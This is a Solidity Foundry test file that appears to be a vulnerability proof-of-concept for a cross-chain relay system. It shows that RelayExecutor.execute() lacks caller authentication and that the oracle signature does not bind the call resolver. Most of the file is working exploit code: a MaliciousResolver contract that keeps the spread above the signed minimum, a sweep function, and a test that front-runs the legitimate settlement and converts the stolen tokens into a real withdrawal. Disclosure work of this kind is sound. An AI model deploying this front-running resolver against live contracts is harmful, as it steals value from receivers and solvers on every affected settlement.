// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {
  BuildPayloadParams,
  IPayloadBuilder,
  RelayAllocator
} from "../src/RelayAllocator.sol";
import {RelayHub} from "../src/RelayHub.sol";
import {RelayExecutor} from "../src/RelayExecutor.sol";
import {Utils} from "../src/Utils.sol";
import {BasicCallResolver} from "../src/call-resolvers/BasicCallResolver.sol";
import {
  ExecuteAndWithdrawRequest,
  Fee,
  ICallResolver
} from "../src/call-resolvers/ICallResolver.sol";

/// @notice Minimal EIP-712 helpers (mirrors the repo's test/utils/Eip712.sol).
library Eip712 {
  Vm internal constant VM =
    Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

  function domainSeparator(
    string memory name,
    string memory version,
    uint256 chainId,
    address verifyingContract
  ) internal pure returns (bytes32) {
    return
      keccak256(
        abi.encode(
          keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
          ),
          keccak256(bytes(name)),
          keccak256(bytes(version)),
          chainId,
          verifyingContract
        )
      );
  }

  function sign(
    uint256 privateKey,
    bytes32 separator,
    bytes32 structHash
  ) internal pure returns (bytes memory) {
    bytes32 digest = keccak256(
      abi.encodePacked("\x19\x01", separator, structHash)
    );
    (uint8 v, bytes32 r, bytes32 s) = VM.sign(privateKey, digest);
    return abi.encodePacked(r, s, v);
  }
}

contract MockPayloadBuilder is IPayloadBuilder {
  function buildPayload(
    string calldata,
    bytes calldata,
    BuildPayloadParams calldata
  ) external pure returns (bytes memory payload) {
    return hex"01";
  }

  function hashesToSign(
    string calldata,
    bytes calldata,
    bytes calldata
  ) external pure returns (bytes32[] memory hashes) {
    return new bytes32[](0);
  }

  function curve() external pure returns (string memory name) {
    return "secp256k1";
  }

  function family() external pure returns (string memory name) {
    return "mock";
  }
}

/// @notice Mock 1:1 swapper over Hub balances (same shape as the repo's test
/// mock). Swaps tokenIn for tokenOut by pulling input and minting output.
contract MockHubSwap {
  RelayHub internal immutable HUB;

  constructor(RelayHub hub) {
    HUB = hub;
  }

  function swap(
    uint256 tokenInId,
    uint256 tokenOutId,
    uint256 sourceAmount,
    uint256 outputAmount
  ) external {
    require(
      HUB.transferFrom(msg.sender, address(this), tokenInId, sourceAmount)
    );
    HUB.mint(msg.sender, tokenOutId, outputAmount);
  }
}

/// @notice The legitimate solver resolver: swaps the ENTIRE funded input and
/// returns ALL of the output to the executor (the receiver gets the full
/// output, not just the minimum).
contract HonestResolver is ICallResolver {
  RelayHub internal immutable HUB;
  MockHubSwap internal immutable SWAPPER;

  constructor(RelayHub hub, MockHubSwap swapper) {
    HUB = hub;
    SWAPPER = swapper;
  }

  function execute(
    ExecuteAndWithdrawRequest calldata request,
    bool,
    bytes calldata
  ) external {
    uint256 tokenInId = Utils.generateTokenId(
      request.inChainId,
      request.inCurrency
    );
    uint256 tokenOutId = Utils.generateTokenId(
      request.outChainId,
      request.outCurrency
    );
    uint256 input = HUB.balanceOf(address(this), tokenInId);
    SWAPPER.swap(tokenInId, tokenOutId, input, input);
    uint256 output = HUB.balanceOf(address(this), tokenOutId);
    require(HUB.transfer(msg.sender, tokenOutId, output));
  }
}

/// @notice The attacker's resolver: swaps ONLY enough input to produce the
/// oracle-signed minimum output, sends exactly that minimum to the executor,
/// and KEEPS the rest of the funded input (the spread) for the attacker.
contract MaliciousResolver is ICallResolver {
  RelayHub internal immutable HUB;
  MockHubSwap internal immutable SWAPPER;
  address public immutable attacker;

  constructor(RelayHub hub, MockHubSwap swapper, address _attacker) {
    HUB = hub;
    SWAPPER = swapper;
    attacker = _attacker;
  }

  function execute(
    ExecuteAndWithdrawRequest calldata request,
    bool,
    bytes calldata
  ) external {
    uint256 tokenInId = Utils.generateTokenId(
      request.inChainId,
      request.inCurrency
    );
    uint256 tokenOutId = Utils.generateTokenId(
      request.outChainId,
      request.outCurrency
    );
    uint256 input = HUB.balanceOf(address(this), tokenInId);
    // Swap only enough to hit the signed minimum; keep the rest.
    uint256 toSwap = request.outAmountMinimum;
    require(toSwap <= input, "minimum exceeds input");
    SWAPPER.swap(tokenInId, tokenOutId, toSwap, toSwap);
    // Return exactly the minimum to the executor (msg.sender).
    require(HUB.transfer(msg.sender, tokenOutId, toSwap));
    // The remaining (input - toSwap) input tokens stay here = stolen spread.
  }

  /// @notice Lets the attacker move the kept spread out of this contract.
  function sweep(address to, uint256 tokenId, uint256 amount) external {
    require(msg.sender == attacker, "only attacker");
    require(HUB.transfer(to, tokenId, amount));
  }
}

/// @notice PoC: RelayExecutor.execute() has no caller authentication, and the
/// oracle-signed request does not commit to the callResolver or its data.
/// Anyone who sees a signed request (public in the mempool when the solver
/// submits it) can front-run the legitimate settlement with their own
/// resolver, return only the signed minimum output, and keep the spread.
/// The receiver still gets the minimum, so the theft is bounded by
/// (expected output - minimum), but it is a systematic, repeatable drain of
/// solver/receiver value on every settlement that uses a non-committing
/// resolver (e.g. BasicCallResolver). PoolDrawResolver binds its plan via the
/// request nonce and is NOT vulnerable to this exact substitution.
contract FrontRunPoC is Test {
  string internal constant IN_CHAIN_ID = "ethereum-mainnet";
  string internal constant OUT_CHAIN_ID = "ethereum-mainnet";
  string internal constant SPENDER_CHAIN_ID = "relay";

  bytes32 internal constant EXECUTE_AND_WITHDRAW_REQUEST_TYPEHASH =
    keccak256(
      "ExecuteAndWithdrawRequest(string inChainId,bytes inCurrency,string outChainId,bytes outCurrency,uint256 outAmountMinimum,bytes depository,address orderAddress,bytes receiver,bytes data,Fee[] fees,bytes32 nonce,uint256 deadline)Fee(address recipient,uint256 amount)"
    );
  bytes32 internal constant FEE_TYPEHASH =
    keccak256("Fee(address recipient,uint256 amount)");

  address internal owner;
  address internal oracleSigner;
  uint256 internal oracleSignerPk;
  address internal attacker;
  address internal depository;
  address internal receiver;
  address internal orderAddress;

  RelayHub internal hub;
  RelayAllocator internal allocator;
  RelayExecutor internal verifier;
  MockPayloadBuilder internal payloadBuilder;
  MockHubSwap internal swapper;

  bytes internal inCurrency;
  bytes internal outCurrency;
  uint256 internal tokenInId;
  uint256 internal tokenOutId;
  bytes32 internal verifierDomain;

  function setUp() public {
    owner = makeAddr("owner");
    (oracleSigner, oracleSignerPk) = makeAddrAndKey("oracleSigner");
    attacker = makeAddr("attacker");
    depository = makeAddr("depository");
    receiver = makeAddr("receiver");
    orderAddress = makeAddr("orderAddress");
    inCurrency = abi.encodePacked(address(0));
    outCurrency = abi.encodePacked(address(1));

    hub = new RelayHub(owner);
    allocator = new RelayAllocator(owner, address(hub), address(0xbeef));
    verifier = new RelayExecutor(owner, address(hub), address(allocator));
    payloadBuilder = new MockPayloadBuilder();
    swapper = new MockHubSwap(hub);

    vm.prank(owner);
    allocator.setPayloadBuilder(
      OUT_CHAIN_ID,
      abi.encodePacked(depository),
      address(payloadBuilder)
    );

    vm.startPrank(owner);
    hub.grantRole(hub.OPERATOR_ROLE(), owner);
    hub.grantRole(hub.OPERATOR_ROLE(), address(verifier));
    hub.grantRole(hub.OPERATOR_ROLE(), address(allocator));
    hub.grantRole(hub.OPERATOR_ROLE(), address(swapper));
    verifier.grantRole(verifier.ORACLE_ROLE(), oracleSigner);
    vm.stopPrank();

    tokenInId = _tokenId(IN_CHAIN_ID, inCurrency);
    tokenOutId = _tokenId(OUT_CHAIN_ID, outCurrency);
    verifierDomain = Eip712.domainSeparator(
      "RelayExecutor",
      "1",
      block.chainid,
      address(verifier)
    );
  }

  /// @notice Baseline: the honest solver swaps everything; the receiver's
  /// withdrawal is the FULL output (1000), not just the minimum.
  function test_honestSolverReceiverGetsFullOutput() public {
    uint256 deposit = 1000;
    uint256 minimum = 950;
    vm.prank(owner);
    hub.mint(orderAddress, tokenInId, deposit);

    ExecuteAndWithdrawRequest memory request = _request(
      orderAddress,
      minimum,
      bytes32(uint256(1))
    );
    bytes memory sig = _sign(oracleSignerPk, request);

    HonestResolver honest = new HonestResolver(hub, swapper);
    vm.prank(attacker); // anyone may relay; here the honest solver relays
    bytes32 wrHash = verifier.execute(
      request,
      address(honest),
      "",
      oracleSigner,
      sig
    );

    // The allocator withdrawal is for the FULL output.
    RelayAllocator.WithdrawRequest memory wr = _allocatorWithdrawRequest(
      request,
      deposit
    );
    assertEq(keccak256(abi.encode(wr)), wrHash, "withdraw hash mismatch");
    assertEq(
      hub.balanceOf(address(verifier), tokenOutId),
      0,
      "executor should hold no output after finalize"
    );
    // The executor funded the spender alias with the full output, then the
    // allocator burned it when building the payload.
    address spenderAlias = Utils.generateAddress(
      SPENDER_CHAIN_ID,
      abi.encodePacked(address(verifier))
    );
    assertEq(hub.balanceOf(spenderAlias, tokenOutId), 0, "alias drained");
    assertGt(allocator.payloads(wrHash).length, 0, "payload built");
  }

  /// @notice The attack: front-run the signed request with a malicious
  /// resolver. The receiver gets ONLY the minimum (950); the attacker keeps
  /// the 50-unit spread as Hub tokens and converts them into a real
  /// allocator withdrawal payload.
  function test_frontRunStealsSpread() public {
    uint256 deposit = 1000;
    uint256 minimum = 950;
    vm.prank(owner);
    hub.mint(orderAddress, tokenInId, deposit);

    ExecuteAndWithdrawRequest memory request = _request(
      orderAddress,
      minimum,
      bytes32(uint256(2))
    );
    bytes memory sig = _sign(oracleSignerPk, request);

    MaliciousResolver evil = new MaliciousResolver(hub, swapper, attacker);

    // The attacker (an unprivileged EOA) executes the oracle-signed request
    // with THEIR resolver. Nothing in execute() restricts the caller or the
    // resolver choice.
    vm.prank(attacker);
    bytes32 wrHash = verifier.execute(
      request,
      address(evil),
      "",
      oracleSigner,
      sig
    );

    // The receiver's withdrawal is only the minimum, not the full output.
    RelayAllocator.WithdrawRequest memory wr = _allocatorWithdrawRequest(
      request,
      minimum
    );
    assertEq(keccak256(abi.encode(wr)), wrHash, "withdraw hash mismatch");

    // The attacker kept the 50-unit spread as Hub tokens in the resolver.
    assertEq(
      hub.balanceOf(address(evil), tokenInId),
      deposit - minimum,
      "attacker should hold the spread"
    );
    assertEq(
      hub.balanceOf(address(evil), tokenOutId),
      0,
      "attacker holds no output tokens"
    );

    // The legitimate settlement is now locked out: the same oracle
    // authorization is single-use.
    HonestResolver honest = new HonestResolver(hub, swapper);
    vm.prank(attacker);
    vm.expectRevert(
      abi.encodeWithSelector(
        RelayExecutor.RequestAlreadyExecuted.selector,
        verifier.hashExecuteAndWithdrawRequest(request)
      )
    );
    verifier.execute(request, address(honest), "", oracleSigner, sig);

    // The attacker converts the stolen Hub tokens into a real withdrawal:
    // move them to a spender alias they control, then submit a withdrawal
    // as the spender. The allocator builds the payload (the MPC then signs
    // it and the depository pays out real tokens).
    address attackerAlias = Utils.generateAddress(
      "ethereum",
      abi.encodePacked(attacker)
    );
    vm.prank(attacker);
    evil.sweep(attackerAlias, tokenInId, deposit - minimum);
    assertEq(
      hub.balanceOf(attackerAlias, tokenInId),
      deposit - minimum,
      "alias funded with stolen spread"
    );

    RelayAllocator.WithdrawRequest memory steal = RelayAllocator
      .WithdrawRequest({
        chainId: IN_CHAIN_ID,
        depository: abi.encodePacked(depository),
        currency: inCurrency,
        amount: deposit - minimum,
        spenderChainId: "ethereum",
        spender: abi.encodePacked(attacker),
        receiver: abi.encodePacked(attacker),
        data: "",
        nonce: bytes32(uint256(999))
      });
    vm.prank(attacker);
    bytes32 stealHash = allocator.submitWithdrawRequest(steal);
    assertGt(
      allocator.payloads(stealHash).length,
      0,
      "stolen funds converted to a withdrawal payload"
    );
    assertEq(
      hub.balanceOf(attackerAlias, tokenInId),
      0,
      "alias burned by the withdrawal"
    );
  }

  // ---- helpers (mirroring the repo's RelayExecutor.t.sol) ----

  function _request(
    address _orderAddress,
    uint256 outAmountMinimum,
    bytes32 nonce
  ) internal view returns (ExecuteAndWithdrawRequest memory) {
    Fee[] memory fees = new Fee[](0);
    return
      ExecuteAndWithdrawRequest({
        inChainId: IN_CHAIN_ID,
        inCurrency: inCurrency,
        outChainId: OUT_CHAIN_ID,
        outCurrency: outCurrency,
        outAmountMinimum: outAmountMinimum,
        depository: abi.encodePacked(depository),
        orderAddress: _orderAddress,
        receiver: abi.encodePacked(receiver),
        data: "",
        fees: fees,
        nonce: nonce,
        deadline: block.timestamp + 1 hours
      });
  }

  function _allocatorWithdrawRequest(
    ExecuteAndWithdrawRequest memory request,
    uint256 amount
  ) internal view returns (RelayAllocator.WithdrawRequest memory) {
    return
      RelayAllocator.WithdrawRequest({
        chainId: request.outChainId,
        depository: request.depository,
        currency: request.outCurrency,
        amount: amount,
        spenderChainId: SPENDER_CHAIN_ID,
        spender: abi.encodePacked(address(verifier)),
        receiver: request.receiver,
        data: request.data,
        nonce: request.nonce
      });
  }

  function _sign(
    uint256 pk,
    ExecuteAndWithdrawRequest memory request
  ) internal view returns (bytes memory) {
    bytes32 structHash = keccak256(
      abi.encode(
        EXECUTE_AND_WITHDRAW_REQUEST_TYPEHASH,
        keccak256(bytes(request.inChainId)),
        keccak256(request.inCurrency),
        keccak256(bytes(request.outChainId)),
        keccak256(request.outCurrency),
        request.outAmountMinimum,
        keccak256(request.depository),
        request.orderAddress,
        keccak256(request.receiver),
        keccak256(request.data),
        _hashFees(request.fees),
        request.nonce,
        request.deadline
      )
    );
    return Eip712.sign(pk, verifierDomain, structHash);
  }

  function _hashFees(Fee[] memory fees) internal pure returns (bytes32) {
    bytes32[] memory feeHashes = new bytes32[](fees.length);
    for (uint256 i; i < fees.length; ++i) {
      feeHashes[i] = keccak256(
        abi.encode(FEE_TYPEHASH, fees[i].recipient, fees[i].amount)
      );
    }
    return keccak256(abi.encodePacked(feeHashes));
  }

  function _tokenId(
    string memory chainId,
    bytes memory currency
  ) internal pure returns (uint256) {
    return uint256(keccak256(abi.encodePacked(chainId, currency)));
  }
}
